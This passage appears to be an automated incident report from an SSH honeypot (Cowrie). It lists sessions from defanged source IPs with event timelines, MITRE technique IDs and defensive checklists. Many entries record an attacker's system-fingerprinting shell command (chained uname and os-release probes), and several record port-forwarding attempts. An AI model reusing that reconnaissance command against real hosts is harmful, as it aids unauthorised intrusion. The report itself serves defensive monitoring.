|---|---|
| `2026-08-03 21:44:55` | `cowrie.session.connect` |
| `2026-08-03 21:44:55` | `cowrie.client.version` |
| `2026-08-03 21:44:56` | `cowrie.client.kex` |
| `2026-08-03 21:44:57` | `cowrie.login.success` |
| `2026-08-03 21:44:58` | `cowrie.session.params` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.success` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.command.input` |
| `2026-08-03 21:44:58` | `cowrie.log.closed` |
| `2026-08-03 21:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fadf73b4c39

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:47 |
| **Last Seen** | 2026-08-03 21:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:47:19` | `cowrie.session.connect` |
| `2026-08-03 21:47:19` | `cowrie.client.version` |
| `2026-08-03 21:47:19` | `cowrie.client.kex` |
| `2026-08-03 21:47:20` | `cowrie.login.success` |
| `2026-08-03 21:47:21` | `cowrie.session.params` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.success` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:21` | `cowrie.command.input` |
| `2026-08-03 21:47:22` | `cowrie.log.closed` |
| `2026-08-03 21:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee5662287e4f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:49 |
| **Last Seen** | 2026-08-03 21:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:49:42` | `cowrie.session.connect` |
| `2026-08-03 21:49:42` | `cowrie.client.version` |
| `2026-08-03 21:49:42` | `cowrie.client.kex` |
| `2026-08-03 21:49:43` | `cowrie.login.success` |
| `2026-08-03 21:49:45` | `cowrie.session.params` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.success` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.command.input` |
| `2026-08-03 21:49:45` | `cowrie.log.closed` |
| `2026-08-03 21:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a059f2f674

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-03 21:50 |
| **Last Seen** | 2026-08-03 21:50 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:50:21` | `cowrie.session.connect` |
| `2026-08-03 21:50:23` | `cowrie.client.version` |
| `2026-08-03 21:50:23` | `cowrie.client.kex` |
| `2026-08-03 21:50:32` | `cowrie.login.success` |
| `2026-08-03 21:50:33` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fa62c7fdf3

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-08-03 21:50 |
| **Last Seen** | 2026-08-03 21:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:50:42` | `cowrie.session.connect` |
| `2026-08-03 21:50:43` | `cowrie.client.version` |
| `2026-08-03 21:50:43` | `cowrie.client.kex` |
| `2026-08-03 21:50:45` | `cowrie.login.success` |
| `2026-08-03 21:50:45` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98951b196043

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:51 |
| **Last Seen** | 2026-08-03 21:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:51:54` | `cowrie.session.connect` |
| `2026-08-03 21:51:54` | `cowrie.client.version` |
| `2026-08-03 21:51:54` | `cowrie.client.kex` |
| `2026-08-03 21:51:56` | `cowrie.login.success` |
| `2026-08-03 21:51:58` | `cowrie.session.params` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.success` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:58` | `cowrie.command.input` |
| `2026-08-03 21:51:59` | `cowrie.log.closed` |
| `2026-08-03 21:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed299221b18

| Field | Detail |
|---|---|
| **Source IP** | `120.48.83[.]162` |
| **First Seen** | 2026-08-03 21:52 |
| **Last Seen** | 2026-08-03 21:57 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:52:58` | `cowrie.session.connect` |
| `2026-08-03 21:52:58` | `cowrie.client.version` |
| `2026-08-03 21:52:58` | `cowrie.client.kex` |
| `2026-08-03 21:52:59` | `cowrie.login.success` |
| `2026-08-03 21:57:59` | `cowrie.session.file_upload` |
| `2026-08-03 21:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.83[.]162` to AbuseIPDB if not already reported
- [ ] Block `120.48.83[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d0ae5dfcac

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:54 |
| **Last Seen** | 2026-08-03 21:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:54:06` | `cowrie.session.connect` |
| `2026-08-03 21:54:06` | `cowrie.client.version` |
| `2026-08-03 21:54:06` | `cowrie.client.kex` |
| `2026-08-03 21:54:08` | `cowrie.login.success` |
| `2026-08-03 21:54:09` | `cowrie.session.params` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.success` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:09` | `cowrie.command.input` |
| `2026-08-03 21:54:10` | `cowrie.log.closed` |
| `2026-08-03 21:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a70aaf9ad1c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:56 |
| **Last Seen** | 2026-08-03 21:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:56:09` | `cowrie.session.connect` |
| `2026-08-03 21:56:10` | `cowrie.client.version` |
| `2026-08-03 21:56:10` | `cowrie.client.kex` |
| `2026-08-03 21:56:12` | `cowrie.login.success` |
| `2026-08-03 21:56:14` | `cowrie.session.params` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.success` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:14` | `cowrie.command.input` |
| `2026-08-03 21:56:15` | `cowrie.log.closed` |
| `2026-08-03 21:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f4d162935f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:58 |
| **Last Seen** | 2026-08-03 21:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:58:12` | `cowrie.session.connect` |
| `2026-08-03 21:58:12` | `cowrie.client.version` |
| `2026-08-03 21:58:12` | `cowrie.client.kex` |
| `2026-08-03 21:58:14` | `cowrie.login.success` |
| `2026-08-03 21:58:15` | `cowrie.session.params` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.success` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.command.input` |
| `2026-08-03 21:58:15` | `cowrie.log.closed` |
| `2026-08-03 21:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a87dbca36cc

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-08-03 21:59 |
| **Last Seen** | 2026-08-03 21:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:59:31` | `cowrie.session.connect` |
| `2026-08-03 21:59:32` | `cowrie.client.version` |
| `2026-08-03 21:59:32` | `cowrie.client.kex` |
| `2026-08-03 21:59:33` | `cowrie.login.success` |
| `2026-08-03 21:59:34` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6078ae9ed4d8

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-03 21:59 |
| **Last Seen** | 2026-08-03 21:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:59:49` | `cowrie.session.connect` |
| `2026-08-03 21:59:50` | `cowrie.client.version` |
| `2026-08-03 21:59:50` | `cowrie.client.kex` |
| `2026-08-03 21:59:52` | `cowrie.login.success` |
| `2026-08-03 21:59:52` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e770fb4ed7

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-08-03 21:59 |
| **Last Seen** | 2026-08-03 22:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:59:58` | `cowrie.session.connect` |
| `2026-08-03 21:59:59` | `cowrie.client.version` |
| `2026-08-03 21:59:59` | `cowrie.client.kex` |
| `2026-08-03 22:00:01` | `cowrie.login.success` |
| `2026-08-03 22:00:01` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481518707e21

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:00 |
| **Last Seen** | 2026-08-03 22:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:00:16` | `cowrie.session.connect` |
| `2026-08-03 22:00:17` | `cowrie.client.version` |
| `2026-08-03 22:00:17` | `cowrie.client.kex` |
| `2026-08-03 22:00:19` | `cowrie.login.success` |
| `2026-08-03 22:00:21` | `cowrie.session.params` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.success` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.command.input` |
| `2026-08-03 22:00:21` | `cowrie.log.closed` |
| `2026-08-03 22:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fd056cdb2b

| Field | Detail |
|---|---|
| **Source IP** | `59.8.48[.]41` |
| **First Seen** | 2026-08-03 22:01 |
| **Last Seen** | 2026-08-03 22:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:01:02` | `cowrie.session.connect` |
| `2026-08-03 22:01:03` | `cowrie.client.version` |
| `2026-08-03 22:01:03` | `cowrie.client.kex` |
| `2026-08-03 22:01:05` | `cowrie.login.success` |
| `2026-08-03 22:01:06` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.8.48[.]41` to AbuseIPDB if not already reported
- [ ] Block `59.8.48[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c32756caab4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-08-03 22:01 |
| **Last Seen** | 2026-08-03 22:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:01:16` | `cowrie.session.connect` |
| `2026-08-03 22:01:16` | `cowrie.client.version` |
| `2026-08-03 22:01:16` | `cowrie.client.kex` |
| `2026-08-03 22:01:18` | `cowrie.login.success` |
| `2026-08-03 22:01:19` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d049f01bf78

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:02 |
| **Last Seen** | 2026-08-03 22:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:02:23` | `cowrie.session.connect` |
| `2026-08-03 22:02:23` | `cowrie.client.version` |
| `2026-08-03 22:02:23` | `cowrie.client.kex` |
| `2026-08-03 22:02:25` | `cowrie.login.success` |
| `2026-08-03 22:02:27` | `cowrie.session.params` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.success` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.command.input` |
| `2026-08-03 22:02:27` | `cowrie.log.closed` |
